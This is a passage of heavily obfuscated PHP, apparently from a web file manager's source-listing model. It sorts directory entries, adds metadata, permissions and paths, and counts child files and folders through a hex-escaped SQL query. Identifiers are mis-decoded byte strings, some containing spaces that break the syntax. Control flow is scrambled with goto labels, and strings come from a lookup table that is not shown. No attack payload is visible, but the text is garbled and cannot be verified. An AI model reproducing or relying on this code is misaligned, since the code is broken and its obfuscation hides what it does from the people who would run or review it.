array($aÂ“Ø­ë¦[411], $Eô–¢ø£Œõ), $aÂ“Ø­ë¦[422] => 1); return $this->listSource($b£–ñˆÇ‘†); } public function listSource($fîÒğ–¨©İ, $A¿¬”Å¢§ = 3000) { goto A™©Àß¸‡¬; A™©Àß¸‡¬: $còŠè†¨„³ =& $_SERVER[¢ÌÛ]; if (!isset($fîÒğ–¨©İ[$còŠè†¨„³[423]])) { $fîÒğ–¨©İ[$còŠè†¨„³[423]] = 0; } $CŞÍ‚Äˆä = $còŠè†¨„³[424]; goto dÛ‰¨‡Î•¥; dÛ‰¨‡Î•¥: $F¿ÒèòŠ¼µ = $this->field($CŞÍ‚Äˆä)->_makeOrder()->where($fîÒğ–¨©İ)->selectPage($A¿¬”Å¢§); $this->_listDataApply($F¿ÒèòŠ¼µ[$còŠè†¨„³[363]]); $this->_listMake($F¿ÒèòŠ¼µ); goto fŒÔ’Ë…²¶; fŒÔ’Ë…²¶: return $F¿ÒèòŠ¼µ; goto c´”ß½è×¬; c´”ß½è×¬: } protected function _makeOrder() { goto FÑ«Ÿğœ”•; Bç Ã…ÑÑê: $eÉŒ‹¨ªØÒ = Input::get($B×Èßµç¬[434], $B×Èßµç¬[7], $Bœå¡¾óßÕ, array_keys($a‰†‘ÑËšÒ)); if (!in_array($dëœ÷‹¶š, array_keys($Få§•ÄÄÌì))) { $dëœ÷‹¶š = $B×Èßµç¬[28]; } if (!in_array($eÉŒ‹¨ªØÒ, array_keys($a‰†‘ÑËšÒ))) { $dëœ÷‹¶š = $B×Èßµç¬[428]; } goto d¬È×›Ò„…; FÑ«Ÿğœ”•: $B×Èßµç¬ =& $_SERVER[¢ÌÛ]; $C††½¶Ä’ = Model($B×Èßµç¬[425])->get($B×Èßµç¬[426]); $Bœå¡¾óßÕ = Model($B×Èßµç¬[425])->get($B×Èßµç¬[427]); goto eÓ¸„ç§£·; d¬È×›Ò„…: if ($dëœ÷‹¶š == $B×Èßµç¬[28]) { } $EÇŞ¯àÑ³á = $B×Èßµç¬[435] . $Få§•ÄÄÌì[$dëœ÷‹¶š] . $B×Èßµç¬[50] . $a‰†‘ÑËšÒ[$eÉŒ‹¨ªØÒ]; return $this->order(rtrim(trim($EÇŞ¯àÑ³á), $B×Èßµç¬[47])); goto D­Ç´Ã±Á; eÓ¸„ç§£·: $a‰†‘ÑËšÒ = array($B×Èßµç¬[428] => $B×Èßµç¬[429], $B×Èßµç¬[430] => $B×Èßµç¬[431]); $Få§•ÄÄÌì = array($B×Èßµç¬[28] => $B×Èßµç¬[28], $B×Èßµç¬[77] => $B×Èßµç¬[77], $B×Èßµç¬[167] => $B×Èßµç¬[399], $B×Èßµç¬[405] => $B×Èßµç¬[405], $B×Èßµç¬[432] => $B×Èßµç¬[406], $B×Èßµç¬[192] => $B×Èßµç¬[192], $B×Èßµç¬[83] => $B×Èßµç¬[83]); $dëœ÷‹¶š = Input::get($B×Èßµç¬[433], $B×Èßµç¬[7], $C††½¶Ä’, array_keys($Få§•ÄÄÌì)); goto Bç Ã…ÑÑê; D­Ç´Ã±Á: } protected function _listDataApplyItem($aò áÏºŠò, $fïõĞÚô›Ğ = false) { $Fõ½º§ˆö = array($aò áÏºŠò); $this->_listDataApply($Fõ½º§ˆö, $fïõĞÚô›Ğ); return $Fõ½º§ˆö[0]; } protected function _listDataApply(&$Dˆô„Öâá, $CôÅƒÇ¡ = false) { goto a¼òÕ Ùù‚; a¼òÕ Ùù‚: $b‰…ÎßŒ =& $_SERVER[¢ÌÛ]; if (!$Dˆô„Öâá) { $Dˆô„Öâá = array(); return; } $eèßÇˆÍóğ = array_to_keyvalue($Dˆô„Öâá, $b‰…ÎßŒ[33], $b‰…ÎßŒ[396]); goto Eùë¦ƒˆ²; Eùë¦ƒˆ²: $eèßÇˆÍóğ = array_unique($eèßÇˆÍóğ); $this->_listSourceCache($Dˆô„Öâá); if (!$CôÅƒÇ¡) { $this->_listAppendMeta($Dˆô„Öâá, $eèßÇˆÍóğ); $this->_listAppendFileMeta($Dˆô„Öâá, $eèßÇˆÍóğ); $this->_listAppendChildren($Dˆô„Öâá, $eèßÇˆÍóğ); } goto aÌŒä…ÀÄÉ; aÌŒä…ÀÄÉ: $this->_listAppendPath($Dˆô„Öâá); $this->_listAppendAuth($Dˆô„Öâá); $this->_listAppendSourceInfo($Dˆô„Öâá, $eèßÇˆÍóğ); goto DˆùÄ—è¬; DˆùÄ—è¬: $this->_listAppendUser($Dˆô„Öâá); $this->_listFilterInfo($Dˆô„Öâá, $CôÅƒÇ¡); goto eÀŒ¼¥¿ï‡; eÀŒ¼¥¿ï‡: } protected function _listSourceCache($aÌøØ½¾Î‘) { $DôÒ’¶ìó… =& $_SERVER[¢ÌÛ]; foreach ($aÌøØ½¾Î‘ as $CŸˆßó‡İ) { self::$cacheSourceInfo[$DôÒ’¶ìó…[436] . $CŸˆßó‡İ[$DôÒ’¶ìó…[396]]] = $CŸˆßó‡İ; } } protected function _listFilterInfo(&$a›¤·µìÔ¼, $cŠÙ½ß¶Ä = false) { $E…ÑìŒØ£Â =& $_SERVER[¢ÌÛ]; foreach ($a›¤·µìÔ¼ as &$d†ÜŒåË¦) { $d†ÜŒåË¦ = $this->pathInfoFilter($d†ÜŒåË¦); self::$cachePathInfo[$E…ÑìŒØ£Â[437] . intval($cŠÙ½ß¶Ä) . $E…ÑìŒØ£Â[438] . $d†ÜŒåË¦[$E…ÑìŒØ£Â[396]]] = $d†ÜŒåË¦; } unset($d†ÜŒåË¦); } protected function _listMake(&$Aóª‚ÛŸ’) { $BëŞˆÈ¾…‚ =& $_SERVER[¢ÌÛ]; $Aóª‚ÛŸ’[$BëŞˆÈ¾…‚[74]] = array(); $Aóª‚ÛŸ’[$BëŞˆÈ¾…‚[73]] = array(); foreach ($Aóª‚ÛŸ’[$BëŞˆÈ¾…‚[363]] as $Dˆ ‹æ­‚£) { $B»ÍØõ = $Dˆ ‹æ­‚£[$BëŞˆÈ¾…‚[397]] == 1 ? $BëŞˆÈ¾…‚[74] : $BëŞˆÈ¾…‚[73]; $Aóª‚ÛŸ’[$B»ÍØõ][] = $Dˆ ‹æ­‚£; } unset($Aóª‚ÛŸ’[$BëŞˆÈ¾…‚[363]]); } protected function _listAppendMeta(&$fğÆÍÖÄÀ, $EÃÑ‹ù±Ûº) { goto dÆİ¥ÛŒ‘; D‘Ãƒê—Û‚: foreach ($E•ñÄ½ô²Í as $A¹‹”Â˜Ø) { if (!isset($E¼´»ÇÂƒĞ[$A¹‹”Â˜Ø[$f¹ÔÇ…Ãêõ[396]]])) { $E¼´»ÇÂƒĞ[$A¹‹”Â˜Ø[$f¹ÔÇ…Ãêõ[396]]] = array(); } if (in_array($A¹‹”Â˜Ø[$f¹ÔÇ…Ãêõ[92]], $dŠˆ©«‡‘)) { continue; } $E¼´»ÇÂƒĞ[$A¹‹”Â˜Ø[$f¹ÔÇ…Ãêõ[396]]][$A¹‹”Â˜Ø[$f¹ÔÇ…Ãêõ[92]]] = $A¹‹”Â˜Ø[$f¹ÔÇ…Ãêõ[368]]; } foreach ($fğÆÍÖÄÀ as &$e‘¾œ¢îùÙ) { $e‘¾œ¢îùÙ[$f¹ÔÇ…Ãêõ[443]] = !1; if (isset($E¼´»ÇÂƒĞ[$e‘¾œ¢îùÙ[$f¹ÔÇ…Ãêõ[396]]])) { $e‘¾œ¢îùÙ[$f¹ÔÇ…Ãêõ[443]] = $E¼´»ÇÂƒĞ[$e‘¾œ¢îùÙ[$f¹ÔÇ…Ãêõ[396]]]; } if ($this->fileIsLock($e‘¾œ¢îùÙ) && $e‘¾œ¢îùÙ[$f¹ÔÇ…Ãêõ[403]]) { $ağ¬¬¯Âã¸ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $e‘¾œ¢îùÙ[$f¹ÔÇ…Ãêõ[403]][$f¹ÔÇ…Ãêõ[404]] = AuthModel::authDisable($e‘¾œ¢îùÙ[$f¹ÔÇ…Ãêõ[403]][$f¹ÔÇ…Ãêõ[404]], $ağ¬¬¯Âã¸); $e‘¾œ¢îùÙ[$f¹ÔÇ…Ãêõ[403]][$f¹ÔÇ…Ãêõ[444]][$f¹ÔÇ…Ãêõ[403]] = $e‘¾œ¢îùÙ[$f¹ÔÇ…Ãêõ[403]][$f¹ÔÇ…Ãêõ[404]]; } } unset($e‘¾œ¢îùÙ); goto f„³ÅƒÍ«; B¨äÊ±‚†: if (!$E•ñÄ½ô²Í) { return; } $dŠˆ©«‡‘ = array($f¹ÔÇ…Ãêõ[441], $f¹ÔÇ…Ãêõ[442]); $E¼´»ÇÂƒĞ = array(); goto D‘Ãƒê—Û‚; dÆİ¥ÛŒ‘: $f¹ÔÇ…Ãêõ =& $_SERVER[¢ÌÛ]; $AÕÔÖåîèÉ = array($f¹ÔÇ…Ãêõ[410] => array($f¹ÔÇ…Ãêõ[411], $EÃÑ‹ù±Ûº)); $E•ñÄ½ô²Í = Model($f¹ÔÇ…Ãêõ[439])->field($f¹ÔÇ…Ãêõ[440])->where($AÕÔÖåîèÉ)->select(); goto B¨äÊ±‚†; f„³ÅƒÍ«: } protected function _listAppendFileMeta(&$D‰ãÆÄ¨àÔ, $Dßì¹²é£) { goto CÓùøïš»; fÊ‘¿ØœçÀ: $Dµ‚â±¯ë¯ = $Dµ‚â±¯ë¯ ? $Dµ‚â±¯ë¯ : array(); $A¦ä†ù³”‘ = array(); foreach ($Dµ‚â±¯ë¯ as $A”Ä„ÅĞ) { if (!isset($A¦ä†ù³”‘[$A”Ä„ÅĞ[$EÆ´ŒÑ ¬[445]]])) { $A¦ä†ù³”‘[$A”Ä„ÅĞ[$EÆ´ŒÑ ¬[445]]] = array(); } $A¦ä†ù³”‘[$A”Ä„ÅĞ[$EÆ´ŒÑ ¬[445]]][$A”Ä„ÅĞ[$EÆ´ŒÑ ¬[92]]] = $A”Ä„ÅĞ[$EÆ´ŒÑ ¬[368]]; } goto eÏ×ã÷Ü¼­; eÏ×ã÷Ü¼­: foreach ($D‰ãÆÄ¨àÔ as &$B”†š—»ƒ¼) { goto C¦ÁëÊíŸ‡; C¦ÁëÊíŸ‡: $E³ªç‰êä‘ = $B”†š—»ƒ¼[$EÆ´ŒÑ ¬[445]]; if (!$E³ªç‰êä‘ || !isset($a¬Öƒ×Îù‚[$E³ªç‰êä‘])) { continue; } $BÙêˆ¢Ì°Ã = $a¬Öƒ×Îù‚[$E³ªç‰êä‘]; goto FÅâŠÍ‚¼; DÑ…ˆÄ„³: unset($a¬Öƒ×Îù‚[$E³ªç‰êä‘][$EÆ´ŒÑ ¬[75]]); $EÀâ‘‹èÃî = is_array($A¦ä†ù³”‘[$E³ªç‰êä‘]) ? $A¦ä†ù³”‘[$E³ªç‰êä‘] : array(); $B”†š—»ƒ¼[$EÆ´ŒÑ ¬[163]] = array_merge($EÀâ‘‹èÃî, $a¬Öƒ×Îù‚[$E³ªç‰êä‘]); goto eìÆ£¨ì…Í; FÅâŠÍ‚¼: $BÙêˆ¢Ì°Ã[$EÆ´ŒÑ ¬[77]] = $B”†š—»ƒ¼[$EÆ´ŒÑ ¬[77]]; $BÙêˆ¢Ì°Ã[$EÆ´ŒÑ ¬[28]] = $B”†š—»ƒ¼[$EÆ´ŒÑ ¬[28]]; if (!isset(self::$cacheFileInfo[$EÆ´ŒÑ ¬[451] . $E³ªç‰êä‘])) { self::$cacheFileInfo[$EÆ´ŒÑ ¬[451] . $E³ªç‰êä‘] = array_merge(array(), $BÙêˆ¢Ì°Ã); } goto DÑ…ˆÄ„³; eìÆ£¨ì…Í: if (isset($B”†š—»ƒ¼[$EÆ´ŒÑ ¬[163]][$EÆ´ŒÑ ¬[162]])) { $B”†š—»ƒ¼[$EÆ´ŒÑ ¬[162]] = json_decode($B”†š—»ƒ¼[$EÆ´ŒÑ ¬[163]][$EÆ´ŒÑ ¬[162]], !0); unset($B”†š—»ƒ¼[$EÆ´ŒÑ ¬[163]][$EÆ´ŒÑ ¬[162]]); } goto b­ß¦½áãÆ; b­ß¦½áãÆ: } unset($B”†š—»ƒ¼); goto c“Øññ°˜Œ; cã’Š³¬¹¥: if (!$C®Íöï”è‹) { return; } $F´ÅóÏ¤Ô¶ = array($EÆ´ŒÑ ¬[446] => array($EÆ´ŒÑ ¬[411], $C®Íöï”è‹)); $aÃè•ä“³¤ = $EÆ´ŒÑ ¬[447]; goto Fõğ× ê§Ï; CÓùøïš»: $EÆ´ŒÑ ¬ =& $_SERVER[¢ÌÛ]; $C®Íöï”è‹ = array_to_keyvalue($D‰ãÆÄ¨àÔ, $EÆ´ŒÑ ¬[33], $EÆ´ŒÑ ¬[445]); $C®Íöï”è‹ = array_filter(array_unique($C®Íöï”è‹)); goto cã’Š³¬¹¥; Fõğ× ê§Ï: $a¬Öƒ×Îù‚ = Model($EÆ´ŒÑ ¬[448])->field($aÃè•ä“³¤)->where($F´ÅóÏ¤Ô¶)->select(); $a¬Öƒ×Îù‚ = array_to_keyvalue($a¬Öƒ×Îù‚, $EÆ´ŒÑ ¬[445]); $Dµ‚â±¯ë¯ = Model($EÆ´ŒÑ ¬[449])->field($EÆ´ŒÑ ¬[450])->where($F´ÅóÏ¤Ô¶)->select(); goto fÊ‘¿ØœçÀ; c“Øññ°˜Œ: } protected function _listAppendSourceInfo(&$fİÁ²¨”ê½, $cîîî¸¹çä) { goto fµÔñß¾; e…à÷ÑËãâ: $b­¼ØØ¸øƒ = Model($CÚÒºÅ—»ù[418])->listData(); $aÖ‚ô°ñ÷ = Model($CÚÒºÅ—»ù[408])->listData(); $FîçŒéåÄ = Model($CÚÒºÅ—»ù[454])->listSimple(); goto c˜Œ±œ“à; d¥áƒ²¾“¹: $FêŞêõº¡ = array_to_keyvalue_group($FîçŒéåÄ, $CÚÒºÅ—»ù[396]); foreach ($fİÁ²¨”ê½ as &$aó¼·™‚Ò) { $aó¼·™‚Ò[$CÚÒºÅ—»ù[84]] = array($CÚÒºÅ—»ù[455] => 0, $CÚÒºÅ—»ù[456] => 0, $CÚÒºÅ—»ù[457] => 0); if (isset($e™™Ú³¤Ä[$aó¼·™‚Ò[$CÚÒºÅ—»ù[396]]])) { $aó¼·™‚Ò[$CÚÒºÅ—»ù[84]][$CÚÒºÅ—»ù[458]] = 1; $aó¼·™‚Ò[$CÚÒºÅ—»ù[84]][$CÚÒºÅ—»ù[459]] = $e™™Ú³¤Ä[$aó¼·™‚Ò[$CÚÒºÅ—»ù[396]]][$CÚÒºÅ—»ù[28]]; } if (isset($Eù³‹Ã¡ãë[$aó¼·™‚Ò[$CÚÒºÅ—»ù[396]]])) { $aó¼·™‚Ò[$CÚÒºÅ—»ù[84]][$CÚÒºÅ—»ù[460]] = array(); foreach ($Eù³‹Ã¡ãë[$aó¼·™‚Ò[$CÚÒºÅ—»ù[396]]] as $aô¦Ğ¯õ³‘) { $FëÓï¼Íİ = $e¬´ˆÄĞ±«[$aô¦Ğ¯õ³‘]; $aó¼·™‚Ò[$CÚÒºÅ—»ù[84]][$CÚÒºÅ—»ù[460]][] = array($CÚÒºÅ—»ù[461] => $FëÓï¼Íİ[$CÚÒºÅ—»ù[385]], $CÚÒºÅ—»ù[413] => $FëÓï¼Íİ[$CÚÒºÅ—»ù[28]], $CÚÒºÅ—»ù[462] => $FëÓï¼Íİ[$CÚÒºÅ—»ù[463]]); } } if (isset($FêŞêõº¡[$aó¼·™‚Ò[$CÚÒºÅ—»ù[396]]])) { $aó¼·™‚Ò[$CÚÒºÅ—»ù[84]][$CÚÒºÅ—»ù[464]] = array(); foreach ($FêŞêõº¡[$aó¼·™‚Ò[$CÚÒºÅ—»ù[396]]] as $CùŞ¥³Ğ–ª) { $aó¼·™‚Ò[$CÚÒºÅ—»ù[84]][$CÚÒºÅ—»ù[464]] = array($CÚÒºÅ—»ù[465] => $CùŞ¥³Ğ–ª[$CÚÒºÅ—»ù[466]], $CÚÒºÅ—»ù[467] => $CùŞ¥³Ğ–ª[$CÚÒºÅ—»ù[468]], $CÚÒºÅ—»ù[469] => $CùŞ¥³Ğ–ª[$CÚÒºÅ—»ù[396]], $CÚÒºÅ—»ù[470] => $CùŞ¥³Ğ–ª[$CÚÒºÅ—»ù[471]], $CÚÒºÅ—»ù[472] => $CùŞ¥³Ğ–ª[$CÚÒºÅ—»ù[473]], $CÚÒºÅ—»ù[474] => $CùŞ¥³Ğ–ª[$CÚÒºÅ—»ù[474]], $CÚÒºÅ—»ù[475] => $CùŞ¥³Ğ–ª[$CÚÒºÅ—»ù[475]]); } } } unset($aó¼·™‚Ò); goto BÆŠœ‡˜Û; fµÔñß¾: $CÚÒºÅ—»ù =& $_SERVER[¢ÌÛ]; if (!defined($CÚÒºÅ—»ù[452])) { return; } $aÛïµÂÊà = Model($CÚÒºÅ—»ù[453])->listData(); goto e…à÷ÑËãâ; c˜Œ±œ“à: $e¬´ˆÄĞ±« = array_to_keyvalue($aÛïµÂÊà, $CÚÒºÅ—»ù[385]); $Eù³‹Ã¡ãë = array_to_keyvalue_group($b­¼ØØ¸øƒ, $CÚÒºÅ—»ù[75], $CÚÒºÅ—»ù[419]); $e™™Ú³¤Ä = array_to_keyvalue($aÖ‚ô°ñ÷, $CÚÒºÅ—»ù[75]); goto d¥áƒ²¾“¹; BÆŠœ‡˜Û: return $fİÁ²¨”ê½; goto Dˆ˜àÁÌÙ¢; Dˆ˜àÁÌÙ¢: } protected function _listAppendChildren(&$bœƒ«ãÒ·, $AêÏ¯¤šà) { goto c§‚œá’†’; DÏ†Ò™…‘ç: $F¡œÍ‚øÑè = 1024 * 50; $bœƒ«ãÒ· = is_array($bœƒ«ãÒ·) ? $bœƒ«ãÒ· : array(); $fíìÃ•ê½ = count($bœƒ«ãÒ·); goto fÑ²ŒğšºÕ; Eòæ÷´¼„™: foreach ($bœƒ«ãÒ· as &$Cè”âŸ¹ñ) { if ($Cè”âŸ¹ñ[$f˜–ø§Æ³[397]]) { unset($Cè”âŸ¹ñ[$f˜–ø§Æ³[399]]); $Cè”âŸ¹ñ[$f˜–ø§Æ³[202]] = intval($DïÀ†ôô—Ã[$Cè”âŸ¹ñ[$f˜–ø§Æ³[396]] . $f˜–ø§Æ³[478]][$f˜–ø§Æ³[479]]); $Cè”âŸ¹ñ[$f˜–ø§Æ³[201]] = intval($DïÀ†ôô—Ã[$Cè”âŸ¹ñ[$f˜–ø§Æ³[396]] . $f˜–ø§Æ³[480]][$f˜–ø§Æ³[479]]); } } unset($Cè”âŸ¹ñ); goto E¶ ‘ŞÀ’Ë; fÑ²ŒğšºÕ: $c‹Ê‚ùºØø = $this->tablePrefix . $this->tableName; for ($c¿ËÌ¬±Ş» = 0; $c¿ËÌ¬±Ş» < $fíìÃ•ê½; $c¿ËÌ¬±Ş»++) { $DøÖÛœóøÃ = intval($bœƒ«ãÒ·[$c¿ËÌ¬±Ş»][$f˜–ø§Æ³[423]]); if ($bœƒ«ãÒ·[$c¿ËÌ¬±Ş»][$f˜–ø§Æ³[397]]) { $d´´Òù¯ÎË = $bœƒ«ãÒ·[$c¿ËÌ¬±Ş»][$f˜–ø§Æ³[396]]; $B„ÁÎ³Í“Ş .= "\123\105\x4c\x45\x43\x54\40\x2a\40\106\x52\x4f\x4d\x20\x28\123\105\x4c\105\103\x54\x20\x27{$d´´Òù¯ÎË}\x5f\x68\x61\x73\106\151\154\x65\47\40\x61\163\x20\x68\141\163\54\x63\157\x75\x6e\x74\x28\61\51\x20\x61\163\x20\150\141\x73\x43\157\165\156\164\x20\x46\122\117\x4d\40\140{$c‹Ê‚ùºØø}\140\x20\xa\11\11\11\x9\x9\x77\x68\x65\x72\x65\x20\x70\x61\162\145\x6e\x74\x49\x44\75{$d´´Òù¯ÎË}\40\141\156\144\40\x69\x73\x46\157\x6c\x64\x65\162\75\60\40\141\156\144\x20\151\163\104\x65\x6c\145\x74\x65\x3d{$DøÖÛœóøÃ}\51\x20\141\163\40\164\142\x31\137{$d´´Òù¯ÎË}\40\x75\x6e\x69\x6f\x6e\40\141\x6c\x6c\x20\xa\11\x9\x9\11\x9\123\105\x4c\105\x43\x54\x20\52\40\106\122\117\x4d\x20\x28\123\x45\114\x45\x43\x54\40\47{$d´´Òù¯ÎË}\137\x68\x61\163\106\157\154\144\145\162\47\40\x61\x73\x20\150\141\x73\106\x69\154\x65\54\x63\x6f\165\x6e\164\50\61\x29\x20\141\x73\x20\150\141\x73\x43\157\x75\156\164\x20\x46\122\x4f\115\x20\x60{$c‹Ê‚ùºØø}\x60\40\xa\11\11\11\x9\x9\167\150\x65\x72\x65\x20\x70\141\162\145\x6e\164\x49\x44\x3d{$d´´Òù¯ÎË}\x20\x61\x6e\x64\x20\x69\163\106\x6f\x6c\x64\x65\x72\x3d\61\40\141\x6e\x64\40\x69\x73\104\x65\154\x65\x74\x65\x3d{$DøÖÛœóøÃ}\x29\x20\141\x73\40\x74\142\62\x5f{$d´´Òù¯ÎË}\x20\165\156\151\x6f\x6e\x20\141\x6c\154\x20"; } if ((strlen($B„ÁÎ³Í“Ş) >= $F¡œÍ‚øÑè || $c¿ËÌ¬±Ş» == $fíìÃ•ê½ - 1) && $B„ÁÎ³Í“Ş) { $B„ÁÎ³Í“Ş = substr($B„ÁÎ³Í“Ş, 0, -strlen($f˜–ø§Æ³[476])); $C…ñ‘İ–óÓ = $this->query($B„ÁÎ³Í“Ş); $DïÀ†ôô—Ã = array_merge($DïÀ†ôô—Ã, $C…ñ‘İ–óÓ); $B„ÁÎ³Í“Ş = $f˜–ø§Æ³[33]; } } $DïÀ†ôô—Ã = array_to_keyvalue($DïÀ†ôô—Ã, $f˜–ø§Æ³[477]); goto Eòæ÷´¼„™; c§‚œá’†’: $f˜–ø§Æ³ =& $_SERVER[¢ÌÛ]; $B„ÁÎ³Í“Ş = $f˜–ø§Æ³[370]; $DïÀ†ôô—Ã = array(); goto DÏ†Ò™…‘ç; E¶ ‘ŞÀ’Ë: } protected function _listAppendAuth(&$c¬Ê¦ğëˆ´) { goto a³Å¹á›‘®; bõø‡ô¤î: foreach ($c¬Ê¦ğëˆ´ as $aÑâƒºÏ«) { if ($aÑâƒºÏ«[$BİÏ´§‰Ëµ[398]] == self::TYPE_GROUP) { $a‚Í™ŒøÅØ[] = $aÑâƒºÏ«[$BİÏ´§‰Ëµ[396]]; } } if (!$a‚Í™ŒøÅØ) { return; } $fî…¬†·¸ = array_to_keyvalue($c¬Ê¦ğëˆ´, $BİÏ´§‰Ëµ[396]); goto bªÎêÉ£³; a³Å¹á›‘®: $BİÏ´§‰Ëµ =& $_SERVER[¢ÌÛ]; if (!defined($BİÏ´§‰Ëµ[452])) { return; } $a‚Í™ŒøÅØ = array(); goto bõø‡ô¤î; bªÎêÉ£³: $cÎÖŠ³ƒ˜ = Model($BİÏ´§‰Ëµ[481])->getSourceList($a‚Í™ŒøÅØ, $fî…¬†·¸); foreach ($c¬Ê¦ğëˆ´ as $C›•›ÜÅùß => &$aÑâƒºÏ«) { $aÑâƒºÏ«[$BİÏ´§‰Ëµ[403]] = $cÎÖŠ³ƒ˜[$aÑâƒºÏ«[$BİÏ´§‰Ëµ[396]]]; if (!$aÑâƒºÏ«[$BİÏ´§‰Ëµ[403]] && $aÑâƒºÏ«[$BİÏ´§‰Ëµ[398]] == self::TYPE_GROUP) { $aÑâƒºÏ«[$BİÏ´§‰Ëµ[403]] = Action($BİÏ´§‰Ëµ[482])->pathGroupAuthMake($aÑâƒºÏ«[$BİÏ´§‰Ëµ[483]]); if (!$aÑâƒºÏ«[$BİÏ´§‰Ëµ[403]] && !_get($GLOBALS, $BİÏ´§‰Ëµ[484])) { $aÑâƒºÏ«[$BİÏ´§‰Ëµ[194]] = !1; $aÑâƒºÏ«[$BİÏ´§‰Ëµ[193]] = !1; } } if ($aÑâƒºÏ«[$BİÏ´§‰Ëµ[403]]) { $aÑâƒºÏ«[$BİÏ´§‰Ëµ[194]] = AuthModel::authCheckEdit($aÑâƒºÏ«[$BİÏ´§‰Ëµ[403]][$BİÏ´§‰Ëµ[404]]); $aÑâƒºÏ«[$BİÏ´§‰Ëµ[193]] = AuthModel::authCheckView($aÑâƒºÏ«[$BİÏ´§‰Ëµ[403]][$BİÏ´§‰Ëµ[404]]); } $this->groupPathDisplay($aÑâƒºÏ«); } unset($aÑâƒºÏ«); goto d¸áÓŸÈø‡; d¸áÓŸÈø‡: } public function groupPathDisplay(&$eÕ‹ìÍ–ÅŞ) { goto a›´ĞáŸ«²; aßøøÔŒÇ†: $BãµãˆÎ¾Ô = $this->parentLevelArray($b„É¶Øé×[$Dá…Öï™Ã[486]]); $BÇµ òóî¾ = $Dá…Öï™Ã[33]; foreach ($BãµãˆÎ¾Ô as $fˆíÍê™) { $A·¼È¯ô‡œ = Model($Dá…Öï™Ã[485])->getInfo($fˆíÍê™); $BÇµ òóî¾ .= $A·¼È¯ô‡œ[$Dá…Öï™Ã[84]][$Dá…Öï™Ã[396]] . $Dá…Öï™Ã[47]; } goto bé„ë°¬…•; bé„ë°¬…•: $eÕ‹ìÍ–ÅŞ[$Dá…Öï™Ã[487]] = $b„É¶Øé×[$Dá…Öï™Ã[488]]; $eÕ‹ìÍ–ÅŞ[$Dá…Öï™Ã[407]] = $b„É¶Øé×[$Dá…Öï™Ã[486]]; $eÕ‹ìÍ–ÅŞ[$Dá…Öï™Ã[489]] = $b„É¶Øé×[$Dá…Öï™Ã[490]]; goto B®³ì‘ìŠô; B®³ì‘ìŠô: $eÕ‹ìÍ–ÅŞ[$Dá…Öï™Ã[491]] = $BÇµ òóî¾ . $b„É¶Øé×[$Dá…Öï™Ã[84]][$Dá…Öï™Ã[396]]; goto bÙŠÜõ¸Ü”; a›´ĞáŸ«²: $Dá…Öï™Ã =& $_SERVER[¢ÌÛ]; if ($eÕ‹ìÍ–ÅŞ[$Dá…Öï™Ã[398]] != self::TYPE_GROUP) { return; } $b„É¶Øé× = Model($Dá…Öï™Ã[485])->getInfo($eÕ‹ìÍ–ÅŞ[$Dá…Öï™Ã[483]]); goto aßøøÔŒÇ†; bÙŠÜõ¸Ü”: } protected function _listAppendPath(&$b‚¬¥•É¤š) { goto AÍ¤Öµš™‘; b¨ÔÌ‡­Œ¯: foreach ($b‚¬¥•É¤š as &$eˆäÇ…í´Ò) { $A È¸Ó‰…[$eˆäÇ…í´Ò[$F«³­Ã—¯—[396]]] = $eˆäÇ…í´Ò[$F«³­Ã—¯—[28]]; $FÆ™°ê¯±´ = $this->parentLevelArray($eˆäÇ…í´Ò[$F«³­Ã—¯—[486]]); foreach ($FÆ™°ê¯±´ as $Fä§Í´“‹ => $A­™óöèÆœ) { if ($Fä§Í´“‹ != 0 && !isset($A È¸Ó‰…[$A­™óöèÆœ])) { $eñ½´ªÊÓÇ[] = $A­™óöèÆœ; } } } unset($eˆäÇ…í´Ò); if (count($eñ½´ªÊÓÇ) > 0) { $eÏšãëàÀš = array($F«³­Ã—¯—[410] => array($F«³­Ã—¯—[411], $eñ½´ªÊÓÇ)); if (count($eñ½´ªÊÓÇ) == 1) { $açØˆóâÜŒ = $this->sourceInfo($eñ½´ªÊÓÇ[0]); $Fê×æî¹Ğœ = is_array($açØˆóâÜŒ) ? array($açØˆóâÜŒ) : !1; } else { $Fê×æî¹Ğœ = $this->field($F«³­Ã—¯—[492])->where($eÏšãëàÀš)->select(); } $aãôÛ”¿Ç = array_to_keyvalue($Fê×æî¹Ğœ, $F«³­Ã—¯—[396], $F«³­Ã—¯—[28]); $A È¸Ó‰… = array_merge_index($A È¸Ó‰…, $aãôÛ”¿Ç); } goto E¦­İÌ; E¦­İÌ: $D‘õ¢Ş”¼ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($b‚¬¥•É¤š as &$eˆäÇ…í´Ò) { goto dêùéĞ™‡“; dêùéĞ™‡“: $FÆ™°ê¯±´ = $this->parentLevelArray($eˆäÇ…í´Ò[$F«³­Ã—¯—[486]]); $c¾ÕÌ»É— = $this->_listAppendPathRoot($eˆäÇ…í´Ò, $FÆ™°ê¯±´); foreach ($FÆ™°ê¯±´ as $Fä§Í´“‹ => $A­™óöèÆœ) { if ($Fä§Í´“‹ == 0 && $c¾ÕÌ»É— && $eˆäÇ…í´Ò[$F«³­Ã—¯—[398]] == self::TYPE_GROUP) { continue; } if (isset($A È¸Ó‰…[$A­™óöèÆœ])) { $c¾ÕÌ»É— .= $A È¸Ó‰…[$A­™óöèÆœ] . $F«³­Ã—¯—[8]; } } goto E»³›§ÊŒ£; B±×ÒóŞ²Ë: $f™ß’ôáƒâ = trim($eˆäÇ…í´Ò[$F«³­Ã—¯—[493]], $F«³­Ã—¯—[8]); if ($eˆäÇ…í´Ò[$F«³­Ã—¯—[488]] == $F«³­Ã—¯—[495] && $f™ß’ôáƒâ) { $eˆäÇ…í´Ò[$F«³­Ã—¯—[28]] = $f™ß’ôáƒâ; } $this->_listAppendPathRecycle($eˆäÇ…í´Ò, $FÆ™°ê¯±´, $D‘õ¢Ş”¼); goto E‡£ŒÊïÛ; E»³›§ÊŒ£: if ($FÆ™°ê¯±´) { $c¾ÕÌ»É— .= $eˆäÇ…í´Ò[$F«³­Ã—¯—[28]]; } if ($eˆäÇ…í´Ò[$F«³­Ã—¯—[397]]) { $c¾ÕÌ»É— .= $F«³­Ã—¯—[8]; } $eˆäÇ…í´Ò[$F«³­Ã—¯—[493]] = str_replace($F«³­Ã—¯—[494], $F«³­Ã—¯—[8], $c¾ÕÌ»É—); goto B±×ÒóŞ²Ë; E‡£ŒÊïÛ: } unset($eˆäÇ…í´Ò); goto C¥Ğí•†Ò; AÍ¤Öµš™‘: $F«³­Ã—¯— =& $_SERVER[¢ÌÛ]; static $A È¸Ó‰… = array(); $eñ½´ªÊÓÇ = array(); goto 